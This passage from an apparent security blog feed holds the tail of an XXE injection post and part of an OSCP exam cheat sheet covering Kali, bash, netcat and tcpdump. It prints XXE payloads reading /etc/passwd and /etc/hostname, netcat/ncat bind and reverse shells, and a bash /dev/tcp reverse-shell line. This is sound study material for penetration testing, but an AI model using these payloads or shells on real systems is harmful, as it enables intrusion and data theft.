<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt;</span> ]&gt;<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;128px&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span><span style="color:#f92672">&gt;&lt;text</span> <span style="color:#a6e22e">font-size=</span><span style="color:#e6db74">&#34;16&#34;</span> <span style="color:#a6e22e">x=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y=</span><span style="color:#e6db74">&#34;16&#34;</span><span style="color:#f92672">&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/text&gt;&lt;/svg&gt;</span>
--------------------------------------------------------------------
XXE inside SOAP body:
<span style="color:#f92672">&lt;soap:Body&gt;&lt;foo&gt;</span><span style="color:#75715e">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://x.x.x.x:22/&#34;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><span style="color:#f92672">&lt;/foo&gt;&lt;/soap:Body&gt;</span>
-------------------------------------------------------------------
XXE: Base64 Encoded:
<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style="color:#f92672">&lt;foo/&gt;</span>
-------------------------------------------------------------------
XXE inside SVG:
<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span> <span style="color:#a6e22e">xmlns:xlink=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span> <span style="color:#a6e22e">width=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">height=</span><span style="color:#e6db74">&#34;200&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;image</span> <span style="color:#a6e22e">xlink:href=</span><span style="color:#e6db74">&#34;expect://ls&#34;</span><span style="color:#f92672">&gt;&lt;/image&gt;</span>
<span style="color:#f92672">&lt;/svg&gt;</span>
--------------------------------------------------------------------
</code></pre></div><h2 id="note">Note</h2>
<p>Alway check file upload can inject xml</p>
<ul>
<li>profile pictures (.svg)</li>
<li>banners (.svg)</li>
<li>photo albums (.svg)</li>
<li>XML imports (.xml)</li>
<li>DOCX/XLSX imports (.docx/.xlsx)</li>
<li>SOAP requests</li>
<li>&hellip;</li>
</ul>
<h2 id="references">References</h2>
<p>-<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a><br>
-<a href="https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/">https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/</a></p>
]]></content>
        </item>
        
        <item>
            <title>OSCP CheatSheet</title>
            <link>https://tranquac.github.io/posts/2021/04/oscp-cheatsheet/</link>
            <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/04/oscp-cheatsheet/</guid>
            <description>This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.
 Try Harder  Summary  Around Kali The Essential Tools Passive Info Gathering Active Information Gathering Vulnerability Scanning Buffer Overflows Win32 Buffer Overflows Linux Buffer Overflows Exploits File Transfers Privilege Escalation Client Side Attacks Web Application Attacks Password Attacks Port Redirection and Tunneling Metasploit Bypassing Antivirus Software Forensics  Around Kali Finding Around Kali Find, Locate, and Which locate Reads from a database prepared by updatedb</description>
            <content type="html"><![CDATA[<p>This is all I have gathered from my practice and oscp exam. It is quite complete. Hope it will help your exam.</p>
<blockquote>
<h3 id="try-harder">Try Harder</h3>
</blockquote>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#around-kali">Around Kali</a></li>
<li><a href="#the-essential-tools">The Essential Tools</a></li>
<li><a href="#passive-info-gathering">Passive Info Gathering</a></li>
<li><a href="#active-information-gathering">Active Information Gathering</a></li>
<li><a href="#vulnerability-scanning">Vulnerability Scanning</a></li>
<li><a href="#buffer-overflows">Buffer Overflows</a></li>
<li><a href="#win32-buffer-overflows">Win32 Buffer Overflows</a></li>
<li><a href="#linux-buffer-overflows">Linux Buffer Overflows</a></li>
<li><a href="#exploits">Exploits</a></li>
<li><a href="#file-transfers">File Transfers</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#client-side-attacks">Client Side Attacks</a></li>
<li><a href="#web-application-attacks">Web Application Attacks</a></li>
<li><a href="#password-attacks">Password Attacks</a></li>
<li><a href="#port-redirection-and-tunneling">Port Redirection and Tunneling</a></li>
<li><a href="#metasploit">Metasploit</a></li>
<li><a href="#bypassing-antivirus-software">Bypassing Antivirus Software</a></li>
<li><a href="#forensics">Forensics</a></li>
</ul>
<h1 id="around-kali">Around Kali</h1>
<h2 id="finding-around-kali">Finding Around Kali</h2>
<h3 id="find-locate-and-which">Find, Locate, and Which</h3>
<h4 id="locate">locate</h4>
<p>Reads from a database prepared by <code>updatedb</code></p>
<p><code>updatedb</code><br>
<code>locate ssh.config</code></p>
<h4 id="which">which</h4>
<p>Returns pathnames of files or links which would be executed in the current environment. It does this by searching the PATH variable.</p>
<p><code>which python</code></p>
<h4 id="find">find</h4>
<ul>
<li><code>find / -name 'file*'</code></li>
<li><code>find / -name 'foldername' -type d</code></li>
<li><code>find / -name 'filename' -type f</code></li>
<li><code>find / -name 'sbd*' -exec file {} \;</code></li>
</ul>
<h2 id="managing-kali-linux-services">Managing Kali Linux Services</h2>
<p>The standard Kali services include ssh, http, sql, which by default would load at boot time, however Kali prevents this by not allowing that, and includes a management system to control their status. Before starting any services, change root password with <code>passwd</code>.</p>
<h3 id="ssh-service">SSH Service</h3>
<p>Port 22</p>
<p><code>service ssh start</code><br>
<code>netstat -tulpn | grep sshd</code><br>
<code>service ssh stop</code><br>
<code>netstat -tulpn | grep sshd</code></p>
<h3 id="http-service">HTTP Service</h3>
<p>Port 80</p>
<p><code>service apache2 start</code><br>
<code>service nginx start</code></p>
<p>Default Apache document root is at <code>/var/www/html</code></p>
<p>To change the index page content, <code>echo &quot;Try harder!&quot; &gt; /var/www/html/index.html</code></p>
<p><code>service apache2 stop</code><br>
<code>service nginx stop</code></p>
<h3 id="service-management">Service Management</h3>
<p><code>service</code> is a wrapper around existing system init scripts located in <code>/etc/init.d/</code> directory. Another way of managing the service, you can directly use the init scripts.</p>
<ul>
<li><code>/etc/init.d/ssh start</code></li>
<li><code>/etc/init.d/ssh stop</code></li>
</ul>
<h3 id="service-boot-persistence">Service Boot Persistence</h3>
<p>Services will be started at boot time.</p>
<ul>
<li><code>update-rc.d ssh enable</code> or <code>systemctl enable ssh</code></li>
<li><code>update-rc.d ssh disable</code> or <code>systemctl disable ssh</code></li>
</ul>
<p>For more granular control of these services, use <code>rcconf</code> or <code>sysv-rc-conf</code>, both to help simplify and manage the boot persistence of these services.</p>
<h2 id="the-bash-environment">The Bash Environment</h2>
<h3 id="intro-to-bash-scripting">Intro to Bash Scripting</h3>
<h4 id="syntax-basic">Syntax basic</h4>
<p>Shebang<br>
<code>#!/bin/bash</code></p>
<p>Bind Variable<br>
<code>user1 = $(whoami)</code><br>
<code>name = &quot;Quac Tran&quot;</code><br>
<code>number = 1</code></p>
<p>If, Else, Elif Statements</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">else</span>
    &lt;perform another action&gt;
<span style="color:#66d9ef">fi</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">then</span>
    &lt;perform different action&gt;
<span style="color:#66d9ef">else</span>
    &lt;perform yet another different action&gt;
<span style="color:#66d9ef">fi</span>
</code></pre></div><p>For loop</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> var-name in &lt;list&gt;
<span style="color:#66d9ef">do</span>
    &lt;action to perform&gt;
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Example: <code>for ip in $(seq 1 10); do echo 10.11.1.$ip; done hay for i in {1..10}; do echo 10.11.1.$i;done</code></p>
<p>While loop</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> &lt;some test&gt; <span style="color:#f92672">]</span>
<span style="color:#66d9ef">do</span>
    &lt;perform an action&gt;
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Function</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">print_me<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
    echo <span style="color:#e6db74">&#34;Try harder!&#34;</span>
<span style="color:#f92672">}</span>
print_me
</code></pre></div><h4 id="practical-bash-usage--example-1">Practical Bash Usage â€“ Example 1</h4>
<blockquote>
<p>Files: cisco.sh</p>
</blockquote>
<p>Find all of cisco.com&rsquo;s subdomains on their homepage and find their IPs.</p>
<h5 id="method-1">Method 1</h5>
<p><code>curl -s https://www.cisco.com | grep 'href=' | cut -d'/' -f3 | grep 'cisco.com' | cut -d'&quot;' -f1 | sort -u &gt; test</code></p>
<ul>
<li><code>curl https://www.cisco.com</code> - Download cisco.com and output to stdout, silent, hide progress</li>
<li><code>grep 'href='</code> - Grep all lines with href links</li>
<li><code>cut -d'/' -f3</code> - Splits lines by slashes and take field number 3 (eg. Field 3 of &hellip;href=&ldquo;<a href="http://hello.cisco.com/%22..">http://hello.cisco.com/&quot;..</a>. will be hello.cisco.com)</li>
<li><code>grep 'cisco.com'</code> - Filter out lines with cisco.com as the domain</li>
<li><code>cut -d'&quot;' -f1</code> - Filter out lines that have trailing quotes</li>
<li><code>sort -u</code> - Sort and remove all duplicates with <code>-u</code> (unique). Compared to <code>uniq</code>, <code>uniq</code> removes duplicates that are adjacent to each other, eg. a a b a -&gt; a b a</li>
</ul>
<h5 id="method-2">Method 2</h5>
<p><code>curl -s https://www.cisco.com | grep -o '[A-Za-z0-9\._-]*\.*cisco\.com' | sort -u</code></p>
<ul>
<li><code>curl -s https://www.cisco.com</code> - Download cisco.com and output to stdout, silent, hide progress</li>
<li><code>grep -o '[A-Za-z0-9\._-]*\.*cisco\.com'</code>
<ul>
<li><code>-o</code> - Output only the matching pattern</li>
<li><code>[A-Za-z0-9\._-]*</code> - Match 0 or more alphanumeric character, including &ldquo;.&rdquo;, &ldquo;_&rdquo; and &ldquo;-&rdquo;</li>
<li><code>\.</code> - URL dot</li>
<li><code>*</code> - Non-regex, grep wildcard in this case, to match domains that end with cisco.com (eg. static-static.com)</li>
<li><code>\.com</code> - URL top level domain</li>
</ul>
</li>
<li><code>sort -u</code> - Sort and remove all duplicates with <code>-u</code> (unique)</li>
</ul>
<h5 id="other-methods">Other Methods</h5>
<ul>
<li><code>curl https://www.cisco.com | grep -o -P '[\w\._-]+\.[\w\._-]*cisco\.com' | sort -u</code> - Equivalent to method 2</li>
<li><code>curl https://www.cisco.com | grep -o -E '\w+\.cisco\.com' | sort -u </code> - Shortcut, less accurate as it doesn&rsquo;t match &ldquo;<a href="http://www.static-cisco.com">www.static-cisco.com</a>&rdquo;</li>
<li><code>wget -q -O - https://www.cisco.com | ...</code> - Wget instead of curl, quiet, and output to stdout</li>
</ul>
<h5 id="final">Final</h5>
<p><code>for url in $(curl -s https://www.cisco.com | grep -o '[A-Za-z0-9\._-]*\.*cisco\.com' | sort -u); do host $url | grep 'has address' | cut -d' ' -f4; done</code></p>
<h4 id="practical-bash-usage--example-2">Practical Bash Usage â€“ Example 2</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat access_log.txt | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1 | sort | uniq -c | sort -urn | head
cat access_log.txt | grep <span style="color:#e6db74">&#39;208.68.234.99&#39;</span> | cut -d<span style="color:#e6db74">&#39;&#34;&#39;</span> -f2 | sort | uniq -c | sort -urn | head
cat access_log.txt | grep <span style="color:#e6db74">&#39;208.68.234.99&#39;</span> | grep <span style="color:#e6db74">&#39;/admin&#39;</span> | sort | uniq -c
<span style="color:#75715e"># cat access_log.txt | grep &#39;208.68.234.99&#39; | grep &#39;/admin&#39; | awk &#39;{print $9}&#39; | sort | uniq -c</span>
</code></pre></div><h3 id="data-manipulation-tools-summary">Data Manipulation Tools Summary</h3>
<h4 id="cut"><code>cut</code></h4>
<ul>
<li><code>-d</code> - Delimiter</li>
<li><code>-f</code> - Field number
<ul>
<li><code>-f4</code> - Field 4</li>
<li><code>-f1,4</code> - Field 1 and 4</li>
<li><code>-f2-5</code> - Fields 2 to 5</li>
<li><code>-f-7</code> - Fields 1 to 7</li>
<li><code>-f3-</code> - Fields 3 and beyond</li>
</ul>
</li>
</ul>
<h4 id="sort-and-uniq"><code>sort</code> and <code>uniq</code></h4>
<ul>
<li><code>sort -u</code> - Sort and remove all duplicates (unique)</li>
<li><code>uniq</code> - Remove duplicates adjacent to each other</li>
<li><code>uniq -c</code> - Remove duplicates adjacent to each other and count</li>
<li><code>uniq -u</code> - Show unique items only (rarely use)</li>
<li><code>sort | uniq -c | sort -urn</code> - Count occurence and sort them from most common to least</li>
</ul>
<h4 id="grep"><code>grep</code></h4>
<ul>
<li><code>grep [pattern]</code> - Print lines only with matching pattern, can handle regular regex, no <code>+</code>, no shorthands, <code>*</code> on its own means grep wildcard</li>
<li><code>grep -arni [pattern]</code> - Process binaries as text, recursive, line prefixed, ignore case</li>
<li><code>grep -arni [pattern] --include \*.md</code> - Process binaries as text, recursive, line prefixed, ignore case, and only from markdown files</li>
<li><code>grep -E [pattern]</code> - Extended regex, <code>+</code>, shorthands, but cannot put shorthands in brackets</li>
<li><code>grep -P [pattern]</code> - Perl/Python regex, <code>+</code>, shorthands, can put shorthands in brackets</li>
</ul>
<p>Windows counterpart of <code>grep</code> is <code>find</code>, eg. <code>netstat -na | find &quot;4444&quot;</code></p>
<h4 id="tr"><code>tr</code></h4>
<ul>
<li><code>medusa -d | grep \+ | cut -d' ' -f6 | cut -d. -f1 | tr '\n' ' '</code> - Translates/substitutes all line breaks with commas, converting multiple lines into a single line separated with spaces</li>
</ul>
<h4 id="for"><code>for</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">IFS<span style="color:#f92672">=</span><span style="color:#e6db74">$&#39;\n&#39;</span> <span style="color:#75715e"># if the list file has spaces, the for loop will split it, so you shud use internal field separator</span>
<span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>cat list<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
  echo <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><h1 id="the-essential-tools">The Essential Tools</h1>
<h2 id="netcatnc">Netcat/<code>nc</code></h2>
<h3 id="connecting-to-a-tcpudp-port">Connecting to a TCP/UDP Port</h3>
<p><code>nc -nv [ip] [port]</code> - <code>-n</code> means do no resolve hostname, <code>-v</code> more verbose</p>
<p>Start Mercury mail server on Win 7 machine.</p>
<ul>
<li>25 - SMTP</li>
<li>110 - POP3</li>
<li>143 - IMAP</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$nc -nv 192.168.1.23 <span style="color:#ae81ff">25</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">25</span> <span style="color:#f92672">(</span>smtp<span style="color:#f92672">)</span> open
<span style="color:#ae81ff">220</span> localhost ESMTP server ready.
HELP
214-Recognized SMTP commands are:
214-   HELO   EHLO   MAIL   RCPT   DATA   RSET
214-   AUTH   NOOP   QUIT   HELP   VRFY   SOML
<span style="color:#ae81ff">214</span> Mail server account is <span style="color:#e6db74">&#39;Maiser&#39;</span>.
^C
$nc -nv 192.168.1.23 <span style="color:#ae81ff">110</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">(</span>pop3<span style="color:#f92672">)</span> open
+OK &lt;87219363.8932@localhost&gt;, POP3 server ready.
^C
$nc -nv 192.168.1.23 <span style="color:#ae81ff">110</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">(</span>pop3<span style="color:#f92672">)</span> open
+OK &lt;87253870.12354@localhost&gt;, POP3 server ready.
USER bob
+OK bob is known here.
PASS bob
-ERR Username or password is invalid or incorrect.
QUIT
+OK localhost Server closing down.
$nc -nv 192.168.1.23 <span style="color:#ae81ff">143</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">143</span> <span style="color:#f92672">(</span>imap2<span style="color:#f92672">)</span> open
* OK localhost IMAP4rev1 Mercury/32 v4.52 server ready.
^C
$
</code></pre></div><h3 id="listening-on-a-tcpudp-port">Listening on a TCP/UDP Port</h3>
<p>On Win 7, move nc.exe to C:\Windows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\O</span>ffsec&gt;nc -nlvp <span style="color:#ae81ff">4444</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span>
connect to <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> from &lt;UNKNOWN&gt; <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">59460</span>
hi
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
$nc -nv 192.168.1.23 <span style="color:#ae81ff">4444</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
hi
</code></pre></div><p>Win 7 is the server, <code>-nlvp 4444</code> no lookup listening (server) verbose bound to port 4444. Kali is the client connecting to it on port 4444 with <code>-nv</code>.</p>
<h3 id="transferring-files-with-netcat">Transferring Files with Netcat</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -nlvp <span style="color:#ae81ff">446</span> &gt; incoming.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
$nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span> &lt; /usr/share/windows-binaries/wget.exe
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.23<span style="color:#f92672">]</span> <span style="color:#ae81ff">4446</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
$
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
incoming.exe -h
</code></pre></div><h3 id="remote-administration-with-netcat">Remote Administration with Netcat</h3>
<h4 id="2141---netcat-bind-shell-scenario">2.1.4.1 - Netcat Bind Shell Scenario</h4>
<p>Alice -&gt; Firewall -&gt; Public IP -&gt; Internet -&gt; Public IP -&gt; Bob</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -lvp <span style="color:#ae81ff">4446</span> -e cmd.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span>

C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\O</span>ffsec&gt;ipconfig
...
</code></pre></div><h4 id="2142---reverse-shell-scenario">2.1.4.2 - Reverse Shell Scenario</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
nc -nlvp <span style="color:#ae81ff">4446</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
nc -nv 192.168.1.23 <span style="color:#ae81ff">4446</span> -e /bin/bash
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win 7</span>
whoami
root
</code></pre></div><h4 id="netcat-as-a-port-monitor">Netcat as a Port Monitor</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">watch -n1 nc -w1 -nvz 192.168.1.23 <span style="color:#ae81ff">123</span>
<span style="color:#75715e"># -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner</span>
</code></pre></div><h2 id="ncat"><code>ncat</code></h2>
<p>Reverse Shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Kali</span>
ncat -lnvp <span style="color:#ae81ff">4444</span> --allow <span style="color:#f92672">[</span>win ip<span style="color:#f92672">]</span> --ssl
<span style="color:#75715e"># Win</span>
ncat -nv <span style="color:#f92672">[</span>kali ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> -e cmd.exe --ssl
</code></pre></div><p>Bind Shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Win</span>
ncat -lnvp <span style="color:#ae81ff">4444</span> -e cmd.exe --allow <span style="color:#f92672">[</span>kali ip<span style="color:#f92672">]</span> --ssl
<span style="color:#75715e"># Kali</span>
ncat -nv <span style="color:#f92672">[</span>win ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> --ssl
</code></pre></div><p>The <code>ncat</code> in the Windows VM produces many errors, even after updating. To update, download &ldquo;nmap-7.60-win32.zip&rdquo; and reinstall the nmap suite, which includes the latest version of ncat. Be warned, errors will still occur.</p>
<h2 id="shells-reference">Shells Reference</h2>
<p>Upgrade a half shell to full interactive shell on a compromised Linux machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># On victim</span>
python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
Ctrl-z
<span style="color:#75715e"># On attacker</span>
echo $TERM <span style="color:#75715e"># note down</span>
stty -a <span style="color:#75715e"># note down rows and cols</span>
stty raw -echo <span style="color:#75715e"># this may be enough</span>
fg
<span style="color:#75715e"># On victim</span>
reset
export SHELL<span style="color:#f92672">=</span>bash
export TERM<span style="color:#f92672">=</span>xterm256-color
stty rows <span style="color:#ae81ff">38</span> columns <span style="color:#ae81ff">116</span>
</code></pre></div><p>Resources:</p>
<ul>
<li>Upgrade to full interactive shell: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></li>
<li>Reverse Shell Cheatsheet: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
<ul>
<li><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></li>
</ul>
</li>
</ul>
<p>Note: Netcat (<code>nc</code>) OpenBSD does not support <code>-e</code>. Netcat versions: GNU, OpenBSD, Traditional, Netcat6</p>
<h2 id="wireshark">Wireshark</h2>
<p>Network -&gt; Capture Filters -&gt; Capture Engine -&gt; Display Filters</p>
<p>Capture filters are very useful as they can selectively capture packets that match a certain criteria. The capture filter syntax is different from the usual display filter syntax. An example would be <code>host 8.8.8.8 and tcp port 80</code>, to capture packets that involve 8.8.8.8 and tcp port 80 only. Display filters on the other hand does not affect the packet capturing process, it just applies a filter to already captured packets, example <code>tcp.port == 80</code>. If you notice, wireshark capture filters are the same as tcpdump capture filters.</p>
<p>Capture filters can be specified in Capture &gt; Options &gt; Capture filter for selected interface, or in Capture &gt; Capture Filters</p>
<p>Follow TCP stream is very useful as in can display the client and server communication in formatted plaintext. It works on web traffic, nc connections (shells, mail, unencrypted connections), etc.</p>
<p>Typical web connection traffic:</p>
<ol>
<li>ARP broadcast looking for the default gateway</li>
<li>ARP unicast reply providing the MAC address of the gateway</li>
<li>DNS A (IPv4) forward lookup query</li>
<li>DNS AAAA (IPv6) forward lookup query</li>
<li>DNS A response received</li>
<li>DNS AAAA response received</li>
<li>3-way handshake on port 80</li>
<li>Initial protocol negotiation in HTTP GET request</li>
</ol>
<h2 id="tcpdump"><code>tcpdump</code></h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">tcpdump -r password_cracking_filtered.pcap | awk <span style="color:#e6db74">&#39;{print $3}&#39;</span> | cut -d. -f-4 | sort | uniq -c | sort -urn  <span style="color:#75715e"># Show most common IPs</span>
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by src host</span>
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by dst host</span>
tcpdump -n port <span style="color:#ae81ff">81</span> -r password_cracking_filtered.pcap <span style="color:#75715e"># Filter by port</span>
tcpdump -nXr password_cracking_filtered.pcap <span style="color:#75715e"># Hex</span>
</code></pre></div><p>Near the bottom of password_cracking_filtered.pcap, after many 401 Authorization Required bad attempts, a 301 occurs after using the following credentials:</p>
<pre><code>GET //admin HTTP/1.1
Host: admin.conglomerate.com:81
User-Agent: Teh Forest Lobster
Authorization: Basic YWRtaW46bmFub3RlY2hub2xvZ3kx
  Credentials: admin:nanotechnology1
</code></pre><h3 id="tcp-flags">TCP Flags</h3>
<p>14th byte of the TCP header</p>
<pre><code>CEUAPRSF
WCRCSSYI
REGKHTNN
</code></pre><p>Apparently, HTTP requests and responses have TCP flags PSH and ACK enabled. To calculate ACK and PSH flags in decimal to use in tcpdump filter:</p>
<pre><code>CEUAPRSF
00011000 = 24 in decimal
</code></pre><p>Online reference: <a href="http://rapid.web.unc.edu/resources/tcp-flag-key/">http://rapid.web.unc.edu/resources/tcp-flag-key/</a></p>
<p>Finally, to filter out the HTTP packets, execute the following command, specifying that the 14th byte in the packets displayed should have ACK/PSH flags set:</p>
